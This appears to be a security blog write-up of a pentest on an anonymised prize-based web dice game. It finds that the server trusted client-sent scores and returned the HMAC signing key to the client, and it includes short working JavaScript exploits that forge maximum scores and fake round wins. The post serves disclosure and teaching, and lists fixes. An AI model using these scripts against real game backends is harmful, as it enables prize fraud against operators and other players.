When AI Builds the Lock
and Forgets the Key

A story about curiosity, a game campaign, client-side trust, and what happens when AI-assisted development ships without a security lens — analyzed with AI assistance itself.

01 —

The Starting Point

I came across a game campaign — a web-based platform where real users competed for real prizes over a multi-day schedule. The app was polished. Smooth animations, clean UI, mobile-responsive, multi-language. It had clearly had significant effort put into it.

Out of curiosity, I opened the browser DevTools. Not with any malicious intent — just the kind of instinctive analytical reflex anyone in security develops over time. What I found over the next few days turned into a comprehensive security analysis covering the entire application stack.

What made this particularly interesting: the application was built largely with AI-assisted coding. And this analysis itself — the methodology, the scripts, the enumeration — was also conducted with AI assistance. That irony is not lost on me, and it's a core part of what this post is about.

Scope note: All testing was performed on accounts I controlled. No user data was accessed. No prizes were fraudulently claimed. Findings were reported to the developer privately before this publication. This post contains no entity names, no PII, and no information that would enable targeted attacks.

02 —

The Architecture

Before diving into findings, it helps to understand what we're working with. The application was a Next.js Client-Side Rendered (CSR) app backed by a REST API. Three game modes, a team system, a leaderboard, and OTP-based phone authentication.

CLIENT (Next.js CSR / Browser)
│
├── Game UI ──────────────────────────── dice rolls generated here ⚠️
├── Score calculation ──────────────────── Math.random() client-side ⚠️
├── HMAC signing ──────────────────────── salt returned from server ⚠️
└── Console logs (production) ─────────── session data exposed ⚠️

API (REST Backend)
│
├── POST /api/v1/challenges/:slug/sessions ── creates session, returns hmacSalt
├── POST /api/v1/challenges/:slug/sessions/:id/trial ── accepts dice1, dice2, score from client
├── POST /api/v1/challenges/daily-dice/sessions/:id/submit ── accepts winner from client
├── GET /api/v1/challenges/:slug/participation ── server-controlled ✓
└── GET /api/v1/challenges/:slug/progress ── server-controlled ✓

AUTH (NextAuth + OTP)
├── POST /api/v1/auth/request-otp ── rate limited server-side ✓
└── POST /api/auth/callback/credentials ── attempt counter cumulative ✓

The stack itself is modern and reasonable. The vulnerabilities were not in the technology choices — they were in the trust model. Specifically, how much the server trusted the client.

03 —

The Findings

Critical Client-Controlled Game Outcomes + HMAC Forgery

The game generated dice rolls entirely in the browser using Math.random(). The resulting values — dice1, dice2, and the computed score — were then sent to the server along with an HMAC signature to prove integrity.

The HMAC is a legitimate security mechanism. The problem: the signing key (hmacSalt) was returned by the server in the session creation response. An attacker could intercept it, forge any dice values they wanted, compute a valid signature, and submit it — and the server would accept it.

Exposed HMAC formula — readable in minified JS bundle
function generateTrialHmac(sessionId, trialNumber, dice1, dice2, score, timestamp, hmacSalt) {
  const message = `${sessionId}:${trialNumber}:${dice1}:${dice2}:${score}:${timestamp}`;
  return CryptoJS.HmacSHA256(message, hmacSalt).toString();
}
Exploit — forge max score for every trial
// 1. Get auth token
const token = (await fetch('/api/auth/session').then(r => r.json())).accessToken;

// 2. Create session — server returns hmacSalt
const session = await fetch('/api/v1/challenges/double-dice/sessions', {
  method: 'POST',
  headers: { Authorization: `Bearer ${token}` },
  body: JSON.stringify({ deviceInfo: { platform: 'web' } })
}).then(r => r.json());

const { sessionId, hmacSalt } = session.data;

// 3. Forge and submit perfect scores for all 3 trials
for (let t = 1; t <= 3; t++) {
  const ts = Date.now();
  const hmac = await hmacSHA256(`${sessionId}:${t}:6:6:24:${ts}`, hmacSalt);

  await fetch(`/api/v1/challenges/double-dice/sessions/${sessionId}/trial`, {
    method: 'POST',
    body: JSON.stringify({ trialNumber: t, dice1: 6, dice2: 6, score: 24, timestamp: ts, hmac })
  });
}
// Result: sessionScore: 72 (maximum possible). Confirmed on live session.

Impact: Any player could achieve the maximum score on every day of the 7-day campaign. The leaderboard competition was completely compromised.

Fix: Generate dice server-side. Never send dice1, dice2, or score from the client. Never return the HMAC signing key in the API response.

Critical No Integrity Protection on Round Submission

A second game mode — a player vs. computer format — had no integrity mechanism at all. The submission endpoint accepted the complete round results directly from the client, including which player won each round.

Exploit — submit all rounds as player wins
await fetch(`/api/v1/challenges/daily-dice/sessions/${sessionId}/submit`, {
  method: 'POST',
  body: JSON.stringify({
    score: 3,
    rounds: [
      { round: 1, playerRoll: 6, computerRoll: 1, winner: 'player' },
      { round: 2, playerRoll: 6, computerRoll: 1, winner: 'player' },
      { round: 3, playerRoll: 6, computerRoll: 1, winner: 'player' }
    ]
  })
});
// Response: { success: true }

The server had pre-determined the game outcome (will_win flag) but never enforced it during submission. The client outcome overrode everything.

Fix: Determine game outcomes server-side. Never accept winner, playerRoll, or computerRoll from the client.

High Verbose Production Console Logs

The production JS bundle contained active console.log statements across all major services. Opening DevTools revealed a live internal debug feed:

Console output visible to any user in production
[DOUBLE DICE SERVICE] Session started: {sessionId}
[DOUBLE DICE SERVICE] Submitting trial: {sessionId, trialNumber, score}
[TEAM DICE SERVICE] Team created: {teamId}
[TEAM DICE SERVICE] Invitation sent successfully
[AUTH_PROVIDER] 401 error, attempting token refresh
[AUTH_PROVIDER] Token refreshed, retrying request
[AUTH_PROVIDER] Signing out with locale: ar
[LOGIN_PAGE] 🚀 Calling requestOtp API...
[LOGIN_PAGE] ✅ OTP API successful

Fix: Strip all console.log calls before production builds. Use build-time environment flags or a logging library with level controls.

High Abandoned Sessions Consume Daily Limit

Starting a game session immediately consumed the user's daily play limit — even if the session expired unused (120 second timeout). A network error, a closed tab, or a slow connection would silently burn the user's only attempt for that day. Their progress showed score: 0, status: NOT_PLAYED but no new session could be created.

Fix: Only consume the daily limit upon successful session completion (sessionCompleted: true), not on session creation.

Passed Auth System — Well Designed

The OTP authentication system was tested thoroughly and held up well. Three independent layers protect against brute force:

  • OTP request rate limited server-side (4 per window → 429)
  • OTP verification limited to 5 attempts per OTP session
  • Failed attempt counter is cumulative across OTP sessions — requesting a new OTP does not reset the block
  • OTP expires in under 1 second of brute forcing (~7 attempts possible before expiry)

Challenge scheduling was also server-enforced. Past days could not be replayed. Completed scores could not be overwritten. The canPlayNow, isActive, and isEnrolled flags were received from the server — not sent by the client.

05 —

The Real Story: AI Built This. And AI Found It.

AI coding tools optimize for one thing: making it work.
They are not security engineers.

The application was built with significant AI assistance. The code was clean. The architecture was modern. The features worked. But the security model had a fundamental flaw that any security-aware developer would have caught in a review: the game trusted the client to report its own outcomes.

This is not a failure of intelligence or effort. It's a failure of context. When you prompt an AI to "generate dice rolls for a game," it will — client-side, because that's the simplest working solution. It will not tell you that client-side randomness in a competitive game with real prizes is a critical vulnerability. It optimizes for the task, not the threat model.

When you ask it to "implement HMAC signing to verify game submissions," it will generate a working HMAC implementation. It will not flag that returning the signing key in the same API response that triggers the signing defeats the entire purpose.

When you ask it to "add logging for debugging," it will add console.log everywhere. It will not remind you to strip them before production.

Here is the irony this analysis adds: this entire pentest was also conducted with AI assistance. The methodology, the enumeration scripts, the JS bundle analysis, the exploit scripts — all developed collaboratively with an AI. Which means the same tool that introduced these vulnerabilities can be used to find them.

The difference is the human in the loop. The developer used AI to build. The analyst used AI to break. The building phase lacked a security review step. The breaking phase had one built in.

The gap is not the tool. The gap is the workflow. AI-assisted development without a security review step will consistently produce applications that work perfectly and fail audits.

06 —

What to Add to Your Workflow

None of this requires a dedicated security team. It requires awareness and a checklist.

  • Never trust the client for competitive outcomes. Any value that affects scores, rankings, or prizes must be generated and validated server-side.
  • Never return secrets in API responses. If you're signing data, the signing key should never travel to the client — ever.
  • Strip debug output before shipping. Set up a build step that removes or disables all console.log calls in production.
  • Open your own app in DevTools before your users do. Read your own JS bundle. If you can understand your entire business logic from the client, so can anyone else.
  • Add a security review prompt to your AI workflow. After generating a feature, explicitly ask: "What are the security implications of this implementation? What could an attacker abuse?"
  • Treat client input as untrusted by default. Validate and reconstruct all game-critical values server-side regardless of what the client sends.

I reported these findings to the developer privately before writing this. I received no response. This post is not an indictment — it's a data point in a larger pattern that the security community needs to talk about more openly as AI-assisted development becomes the norm.

The tools are extraordinary. The code ships faster than ever. The responsibility for what that code does — and what it exposes — remains entirely with the humans who ship it.
